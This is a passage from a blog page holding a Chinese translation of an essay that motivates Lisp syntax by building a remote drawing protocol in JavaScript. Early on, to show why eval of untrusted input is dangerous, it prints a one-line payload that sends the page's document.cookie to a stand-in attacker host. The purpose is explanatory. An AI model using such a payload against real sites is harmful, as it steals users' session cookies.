<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" /><meta property="og:title" content="直观理解 Lisp 语法 — 狐狸反走矣" /><meta property="og:site_name" content="狐狸反走矣" /><meta property="og:image" content="https://blog.southfox.me/favicon.png" /><meta name="fediverse:creator" content="SouthFox@foxsay.southfox.me" /><title>直观理解 Lisp 语法 — 狐狸反走矣</title><link rel="me" href="https://foxsay.southfox.me/@SouthFox" /><link rel="me" href="https://codeberg.org/southfox" /><script src="/assets/js/lips.min.js"></script><link rel="stylesheet" href="/assets/css/main.css" /><script type="text/x-scheme">(let ((font (or (localStorage.getItem "font") "zpix")) (font-select (document.getElementById "font-select"))) (define (string=? a b) (== (a.cmp b) 0)) (define (loop-set options value) (let loop ((i 0)) (if (> i (- (length options) 1)) i (let ((option (get options i))) (if (string=? option.value value) (option.setAttribute "selected" #t) (loop (+ 1 i))))))) (define (set-font font-name) (localStorage.setItem "font" font-name) (document.documentElement.setAttribute "data-font" font-name) (if font-select (loop-set font-select.options font-name))) (font-select.addEventListener "change" (lambda (event) (set-font event.target.value))) (set-font font))</script><link rel="alternative" href="/feed.xml" title="狐狸反走矣" type="application/atom+xml" /><link rel="alternative" href="/rss2.xml" title="狐狸反走矣" type="application/rss+xml" /></head><body><nav class="nav"><a href="/" class="brand"><span>狐狸反走矣</span></a><input id="bmenub" type="checkbox" class="show" aria-label="open menu" /><label for="bmenub" class="burger pseudo button">☰</label><div class="menu"><a href="/archives/">归档</a><a href="/tags/">标签</a><a href="/search/">搜索</a><a href="/about/">关于</a></div></nav><div class="container flex"><div class="content"><main data-pagefind-body="true"><div><h2>直观理解 Lisp 语法</h2><h3>by SouthFox</h3><h3 data-pagefind-sort="date">2025-12-19</h3><div><blockquote><p>这是一篇翻译文章！原文为： <a href="https://stopa.io/post/265" class="external_link">An Intuition for Lisp Syntax</a></p></blockquote><p>每个我遇到的 lisp 黑客（包括我），都觉得 lisp 里那些括号让人反感又奇怪，当然，只在一开始。很快我们就顿悟
到了同一个事： lisp 的力量就在这些括号里！在这篇文章中，我们将踏上通往这条顿悟之路。</p><span id="more"></span><h2 id="绘画">绘画</h2><p>假设现在让你写程序画点东西。如果我们用 JavaScript 编写，那我们可能有这些函数：</p><pre><code><span class="syntax-symbol">drawPoint</span><span class="syntax-open">(</span><span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">'yellow'</span><span class="syntax-close">)</span>
<span class="syntax-symbol">drawLine</span><span class="syntax-open">(</span><span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">'blue'</span><span class="syntax-close">)</span>
<span class="syntax-symbol">drawCircle</span><span class="syntax-open">(</span><span class="syntax-symbol">point</span><span class="syntax-operator">,</span> <span class="syntax-symbol">radius</span><span class="syntax-operator">,</span> <span class="syntax-string">'red'</span><span class="syntax-close">)</span>
<span class="syntax-symbol">rotate</span><span class="syntax-open">(</span><span class="syntax-symbol">shape</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">)</span>
<span class="syntax-operator">...</span></code></pre><p>目前为止还不错。</p><h2 id="挑战">挑战</h2><p>现在挑战来了：我们能支持远程绘图吗？</p><p>这意味者用户可能会「发送」一些指令到你的屏幕上，然后让你看到他们的绘画过程。</p><p>该怎么做呢？</p><p>嗯，如果我们设置了一个 websocket 链接，我们可以像这样接收用户发送的指令：</p><pre><code><span class="syntax-symbol">websocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-comment">/* TODO */</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><h2 id="Eval">Eval</h2><p>为了让它马上运作，一种方式是直接读取并运行输入进来的代码：</p><pre><code><span class="syntax-symbol">websocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-keyword">eval</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span><span class="syntax-close">)</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><p>这样用户就可以发送 <code>&quot;drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')&quot;</code> 之后就会嘣：画出一条线！</p><p>但……你可能现在就脊背发凉了，如果恶意用户发送了这样的指令：</p><pre><code><span class="syntax-keyword">window</span><span class="syntax-operator">.</span><span class="syntax-symbol">location</span><span class="syntax-operator">=</span><span class="syntax-string">'http://iwillp3wn.com?user_info='</span> <span class="syntax-operator">+</span> <span class="syntax-keyword">document</span><span class="syntax-operator">.</span><span class="syntax-symbol">cookie</span></code></pre><p>啊哦，我们的 cookie 会被发送到 iwillp3wn.com 然后我们就被黑了。我们不能用 eval ，太危险了。</p><p>这就是问题所在：我们不能用 eval 但需要某种方式接受任意的指令。</p><h2 id="初步想法">初步想法</h2><p>那么，我们可以用 JSON 来表示这些指令，将这些 JSON 映射到一个特殊的函数然后控制运行的内容。
这是一种表现方式：</p><pre><code><span class="syntax-open">{</span>
  <span class="syntax-symbol">instructions</span><span class="syntax-operator">:</span> <span class="syntax-open">[</span>
    <span class="syntax-open">{</span> <span class="syntax-symbol">functionName</span><span class="syntax-operator">:</span> <span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">args</span><span class="syntax-operator">:</span> <span class="syntax-open">[</span><span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span>
  <span class="syntax-close">]</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span></code></pre><p>这个 JSON 会被转换成 <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},&quot;blue&quot;)</code> 。</p><p>实现这种转换也相当简单，我们的 onMessage 可能看起来像：</p><pre><code><span class="syntax-symbol">webSocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">instruction</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">fns</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
    <span class="syntax-symbol">drawLine</span><span class="syntax-operator">:</span> <span class="syntax-symbol">drawLine</span><span class="syntax-operator">,</span>
    <span class="syntax-operator">...</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">data</span><span class="syntax-operator">.</span><span class="syntax-symbol">instructions</span><span class="syntax-operator">.</span><span class="syntax-symbol">forEach</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">ins</span><span class="syntax-operator">.</span><span class="syntax-symbol">functionName</span><span class="syntax-close">]</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">ins</span><span class="syntax-operator">.</span><span class="syntax-symbol">args</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><p>看起来至少能用！</p><h2 id="初步简化">初步简化</h2><p>让我们看看能不能更简洁一点，现在的 JSON ：</p><pre><code><span class="syntax-open">{</span>
  <span class="syntax-symbol">instructions</span><span class="syntax-operator">:</span> <span class="syntax-open">[</span>
    <span class="syntax-open">{</span> <span class="syntax-symbol">functionName</span><span class="syntax-operator">:</span> <span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">args</span><span class="syntax-operator">:</span> <span class="syntax-open">[</span><span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span>
  <span class="syntax-close">]</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span></code></pre><p>嗯，因为每个指令都有一个 functionName 和 args ，我们就不需要特别指明了，我们可以写成这样：</p><pre><code><span class="syntax-open">{</span>
  <span class="syntax-symbol">instructions</span><span class="syntax-operator">:</span> <span class="syntax-open">[</span><span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-close">}</span></code></pre><p>不错，我们将对象改成一个数组。然后为了处理这个还需要调整规则：指令的第一部分是函数名称，剩下的就都是参数。
现在我们 onMessage 可能看起来像：</p><pre><code><span class="syntax-symbol">websocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">fns</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
    <span class="syntax-symbol">drawLine</span><span class="syntax-operator">:</span> <span class="syntax-symbol">drawLine</span><span class="syntax-operator">,</span>
    <span class="syntax-operator">...</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">data</span><span class="syntax-operator">.</span><span class="syntax-symbol">instructions</span><span class="syntax-operator">.</span><span class="syntax-symbol">forEach</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">]</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><p>嘣，我们的 drawLine 又能用了！</p><h2 id="更多力量">更多力量</h2><p>到目前为止我们用了 drawLine ：</p><pre><code><span class="syntax-symbol">drawLine</span><span class="syntax-open">(</span><span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">'blue'</span><span class="syntax-close">)</span>
<span class="syntax-comment">// 相当于
</span><span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span></code></pre><p>但我们如果想表达更有力的东西：</p><pre><code><span class="syntax-symbol">rotate</span><span class="syntax-open">(</span><span class="syntax-symbol">drawLine</span><span class="syntax-open">(</span><span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">'blue'</span><span class="syntax-close">)</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">)</span></code></pre><p>看看这个，我们可以把这条指令转换成这样：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;rotate&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">]</span></code></pre><p>这里， rotate 指令的一个参数可以是指令！很强大，而且我们只需要稍微调整下我们的代码就能让它运行：</p><pre><code><span class="syntax-symbol">websocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">fns</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
    <span class="syntax-symbol">drawLine</span><span class="syntax-operator">:</span> <span class="syntax-symbol">drawLine</span><span class="syntax-operator">,</span>
    <span class="syntax-operator">...</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">parseInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-operator">!</span><span class="syntax-keyword">Array</span><span class="syntax-operator">.</span><span class="syntax-symbol">isArray</span><span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-comment">// 这里是原始的参数例如： {x: 0, y: 0}
</span>      <span class="syntax-special">return</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">const</span> <span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">map</span><span class="syntax-open">(</span><span class="syntax-symbol">parseInstruction</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">data</span><span class="syntax-operator">.</span><span class="syntax-symbol">instructions</span><span class="syntax-operator">.</span><span class="syntax-symbol">forEach</span><span class="syntax-open">(</span><span class="syntax-symbol">parseInstruction</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><p>很好，我们引入了一个 <code>parseInstruction</code> 函数。我们可以用 <code>parseInstruction</code> 递归处理参数，比如这样：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;rotate&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;rotate&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-symbol">30</span><span class="syntax-close">]</span></code></pre><p>非常酷！</p><h2 id="进一步简化">进一步简化</h2><p>好，再看看我们的 JSON ：</p><pre><code><span class="syntax-open">{</span>
  <span class="syntax-symbol">instructions</span><span class="syntax-operator">:</span> <span class="syntax-open">[</span><span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-close">}</span></code></pre><p>我们的数据只包含了 instructions ，但我们真得需要一个 <code>instructions</code> 的键吗？</p><p>如果我们写成这样：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-close">]</span></code></pre><p>与其用一个顶层的键我们现在可以用一个叫 <code>do</code> 的特别指令来执行给出的指令。</p><p>以下是一种实现方式：</p><pre><code><span class="syntax-symbol">websocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">fns</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
    <span class="syntax-operator">...</span>
    <span class="syntax-special">do</span><span class="syntax-operator">:</span> <span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">args</span><span class="syntax-open">[</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">length</span> <span class="syntax-operator">-</span> <span class="syntax-symbol">1</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">parseInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-operator">!</span><span class="syntax-keyword">Array</span><span class="syntax-operator">.</span><span class="syntax-symbol">isArray</span><span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-comment">// 这里是原始的参数例如： {x: 0, y: 0}
</span>      <span class="syntax-special">return</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">const</span> <span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">map</span><span class="syntax-open">(</span><span class="syntax-symbol">parseInstruction</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">instruction</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><p>哦哇，真简单。我们只是为 <code>fns</code> 添加了 <code>do</code> 的定义，现在就能支持像这样的指令了：</p><pre><code><span class="syntax-open">[</span>
  <span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;drawPoint&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;rotate&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">]</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-close">]</span><span class="syntax-operator">;</span></code></pre><h2 id="更强大的力量">更强大的力量</h2><p>让我们让它更有趣点，如果我们想要支持定义呢？</p><pre><code><span class="syntax-special">const</span> <span class="syntax-symbol">shape</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">drawLine</span><span class="syntax-open">(</span><span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">'red'</span><span class="syntax-close">)</span>
<span class="syntax-symbol">rotate</span><span class="syntax-open">(</span><span class="syntax-symbol">shape</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">)</span></code></pre><p>如果我们能够实现定义，远程用户就能写出非常有表现力的指令！让我们把代码转换成我们之前一直在用的数据形式：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;def&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;shape&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-close">]</span>
<span class="syntax-open">[</span><span class="syntax-string">&quot;rotate&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;shape&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">]</span></code></pre><p>不错！如果真能支持这样的指令就好了，现在：</p><pre><code><span class="syntax-symbol">websocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">variables</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span><span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">fns</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
    <span class="syntax-operator">...</span>
